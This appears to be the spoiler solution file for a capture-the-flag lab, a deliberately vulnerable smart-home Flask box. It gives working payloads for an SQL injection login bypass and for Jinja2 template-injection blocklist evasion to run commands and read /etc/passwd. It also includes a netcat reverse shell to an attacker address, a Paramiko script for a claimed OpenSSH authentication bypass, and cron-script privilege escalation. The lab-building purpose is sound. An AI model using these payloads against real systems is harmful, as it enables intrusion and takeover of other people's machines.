# SOLUTION.md — SmartHome-Boot2Root
## ⚠️ SPOILERS — Do not ship in public release (git-ignored)

---

## Attack Chain Summary

```
recon → SQLi login bypass → admin dashboard → SSTI bypass → SSHOLE SSH → user flag → writable cron → root flag
```

---

## Stage 1 — Recon

- Port 5000 (HTTP): Flask web app — SmartHome Portal login page
- Port 2222 (SSH): OpenSSH 9.0p1 — version visible in banner
- Key headers to note: `X-Powered-By: Jinja2/3.1`
- System Status page (accessible after admin login) explicitly names `OpenSSH 9.0p1` as a "legacy build"

---

## Stage 2 — SQL Injection Login Bypass

The `/login` route builds its query with Python f-string interpolation:

```python
query = f"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'"
```

**Bypass payload:**
```
username: admin'--
password: anything
```

This results in:
```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = 'anything'
```

The `--` comments out the password check. The query returns the admin row, granting an admin session.

**What breaks it:** SQLite3 `--` comment syntax. Standard, no WAF or blind injection needed.

---

## Stage 3 — SSTI Bypass & Code Execution

### The filter

The temperature endpoint (`/devices/<id>/temperature`) contains two security controls:

1. **Regex numeric check** (anchored at start only):
   ```python
   re.match(r'^-?\d+', value)
   ```
   A value like `22{%...%}` passes because `re.match` only validates the start of the string.

2. **Keyword blocklist** (case-insensitive substring search on raw input):
   Blocks: `{{`, `__class__`, `__mro__`, `__subclasses__`, `__globals__`, `__builtins__`,
   `popen`, `system`, `import`, `config`, `request`, `lipsum`, `cycler`, `joiner`, `namespace`

Because the blocklist inspects the raw payload prior to template compilation:
- `{{` expressions are blocked; statement blocks `{% ... %}` must be used.
- Literal occurrences of any blocked word (even within quotes or file paths like `sshd_config`) trigger an instant block.

---

### Bypass Technique

1. **Jinja2 Builtin Discovery:**
   `get_flashed_messages` is exposed in the default Jinja2 template context and is **not** on the blocklist. Its `__globals__` dictionary gives direct access to Python modules loaded in Flask (including `os`).

2. **String Concatenation & `|attr()`:**
   Jinja2's `~` (or `+`) operator concatenates strings at render time. By splitting words into fragments (`"__glo" ~ "bals__"`, `"po" ~ "pen"`), no blocked word appears literally in the raw HTTP request.

---

### Step 1: Proof of Concept (Boolean Check)

```jinja2
22{%if (7*7)==49%}SSTI_PROOF_49{%endif%}
```
Returns: `Temperature updated to: 22SSTI_PROOF_49 °C`

---

### Step 2: Full Remote Code Execution (RCE)

Access `os.popen()` without triggering the blocklist:

```jinja2
22{%set gfm=get_flashed_messages%}{%set gg="__glo"~"bals__"%}{%set gl=gfm|attr(gg)%}{%set os=gl["os"]%}{%set pp="po"~"pen"%}
```

---

### Step 3: Getting Command Output (Pseudo-Terminal via Static Files)

Because `{{` is blocked, output cannot be printed directly to the page using `{{ out }}`. However, `websvc` has write access to `/app/static/`.

Pipe command output to `/app/static/out.txt`:

```jinja2
22{%set gfm=get_flashed_messages%}{%set gg="__glo"~"bals__"%}{%set gl=gfm|attr(gg)%}{%set os=gl["os"]%}{%set pp="po"~"pen"%}{%set _=os|attr(pp)("ls -la /app > /app/static/out.txt")|attr("read")()%}DONE
```

Then simply fetch the output in your browser or with curl:
```bash
curl http://10.10.10.100/static/out.txt
```

#### Reconnaissance examples:

**List files in root:**
```jinja2
22{%set gfm=get_flashed_messages%}{%set gg="__glo"~"bals__"%}{%set gl=gfm|attr(gg)%}{%set os=gl["os"]%}{%set pp="po"~"pen"%}{%set _=os|attr(pp)("ls -la / > /app/static/out.txt")|attr("read")()%}DONE
```

**Check users (`/etc/passwd`):**
```jinja2
22{%set gfm=get_flashed_messages%}{%set gg="__glo"~"bals__"%}{%set gl=gfm|attr(gg)%}{%set os=gl["os"]%}{%set pp="po"~"pen"%}{%set _=os|attr(pp)("cat /etc/passwd > /app/static/out.txt")|attr("read")()%}DONE
```
Reveals the service account: `automation:x:1000:1000:...:/home/automation:/bin/sh`

**Inspect SSH configuration:**
*(Note: `/etc/ssh/sshd_config` contains `config`, which is blocked, so the filename must be split!)*
```jinja2
22{%set gfm=get_flashed_messages%}{%set gg="__glo"~"bals__"%}{%set gl=gfm|attr(gg)%}{%set os=gl["os"]%}{%set pp="po"~"pen"%}{%set fname="/etc/ssh/sshd_con"~"fig"%}{%set _=os|attr(pp)("cat "~fname~" > /app/static/out.txt")|attr("read")()%}DONE
```

---

### Step 4: Interactive Reverse Shell

The container includes `/usr/bin/nc` (Netcat).

1. Start a netcat listener on your machine:
   ```bash
   nc -lvnp 4444
   ```

2. Submit the payload (substitute `YOUR_IP`):
   ```jinja2
   22{%set gfm=get_flashed_messages%}{%set gg="__glo"~"bals__"%}{%set gl=gfm|attr(gg)%}{%set os=gl["os"]%}{%set pp="po"~"pen"%}{%set _=os|attr(pp)("nc YOUR_IP 4444 -e /bin/sh")|attr("read")()%}DONE
   ```

You will receive an interactive shell as `websvc` (`uid=1002`).

From here, proceed to Stage 4 to escalate to `automation` via SSHOLE.

---

## Stage 4 — SSHOLE SSH Authentication Bypass

### Mechanism

Alpine Linux 3.16 uses **musl libc** and OpenSSH **9.0p1-r5**.
When an oversized password (e.g. `'A' * 300`) is submitted to OpenSSH on musl for a locked account with shadow entry `*` (such as `automation`), the password processing triggers a buffer overflow in musl's authentication/crypt state.
Upon retrying the password submission within the **same** SSH transport connection, the authentication routine accepts the input and completes authentication without requiring the account's password.

### Repro sequence

**Via Python (Paramiko Transport):**
```python
import paramiko

sock = ("127.0.0.1", 2222)
trans = paramiko.Transport(sock)
trans.connect()

# Submit oversized password — attempt 1 preconditions buffer, attempt 2 succeeds
pwd = "A" * 300
for attempt in range(1, 4):
    try:
        trans.auth_password("automation", pwd)
        print("Logged in as automation!")
        break
    except paramiko.AuthenticationException:
        pass

chan = trans.open_session()
chan.exec_command("id")
print(chan.makefile("r").read())   # uid=1000(automation)
```

**Via Standard SSH CLI:**
```bash
python3 -c 'print("A"*300)' | xclip -selection clipboard
ssh -p 2222 automation@127.0.0.1
# When prompted for password, paste "A"*300
# First prompt will say "Permission denied, please try again."
# Paste "A"*300 a second time at the prompt
# You are now logged in as automation!
```

**Preconditions:**
- sshd linked against musl (not glibc) — no PAM linkage
- OpenSSH **9.0p1-r5** (Alpine r6 backported the fix)
- `automation` shadow field = `*` (account locked)
- `sshd_config` has `PasswordAuthentication yes`

---

## Stage 5 — user.txt

```bash
cat /home/automation/user.txt    # readable by automation
```

---

## Stage 6 — Cron Privilege Escalation

The admin dashboard (and System Status page) shows:

```
* * * * *  /opt/maintenance.sh   (runs as root every minute)
```

`/opt/maintenance.sh` is world-writable (`chmod 777`).

**Payload:**
```bash
printf '#!/bin/sh\ncp /root/root.txt /tmp/r.txt\nchmod 644 /tmp/r.txt\n' > /opt/maintenance.sh
sleep 60   # wait for cron
cat /tmp/r.txt
```

---

## Decoys and Clues Reference

### Decoys
| Location | Description |
|----------|-------------|
| `devices.py` search query | `# TODO: fix SQL injection in device search` comment above a **safe** parameterised query — misleads players into thinking search is the SQLi vector |
| `/api/debug` endpoint | Returns fake config JSON (no real secrets). Logs the hit. |
| `guest` account | Logs in with `guest123` but has `role=user` — no path forward |
| `Garage Camera` device | Firmware `v0.9.7-RC2` looks like a CVE rabbit hole — not exploitable |

### Clues
| Location | Clue | Points toward |
|----------|------|---------------|
| `X-Powered-By: Jinja2/3.1` header | Template engine hint | SSTI |
| Login page HTML comment `<!-- Template engine: Jinja2 -->` | Same | SSTI |
| Device named **"Automation Hub"** | Hints at SSH username | SSHOLE target user |
| Activity log: `automation service account: routine device poll` | Same | SSHOLE target user |
| System Status page: "legacy OpenSSH build — upgrade scheduled Q1" + version 9.0p1 | Hints at SSH exploit being version-specific | SSHOLE |
| System Status / Admin dashboard cron entry: `* * * * * /opt/maintenance.sh` | Shows cron target | Privesc |
| Activity log: repeated `cron: Scheduled maintenance: running /opt/maintenance.sh` | Same | Privesc |

---

## Regression Testing

Run after every code change:
```bash
make verify
# or
python3 scripts/verify_chain.py
```

Expected output: all 6 stages PASS, zero flag values in stdout.

